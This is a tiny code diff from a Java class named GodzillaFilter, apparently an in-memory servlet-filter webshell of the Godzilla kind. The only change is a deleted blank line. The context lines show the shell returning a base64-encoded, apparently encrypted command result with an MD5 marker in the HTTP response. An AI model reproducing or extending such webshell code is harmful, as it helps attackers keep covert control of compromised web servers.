@@ -108,7 +108,6 @@ public class GodzillaFilter extends ClassLoader implements Filter {
                     response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                     response.getWriter().write(md5.substring(16));
                 }
-
             } else {
                 chain.doFilter(servletRequest, servletResponse);
             }
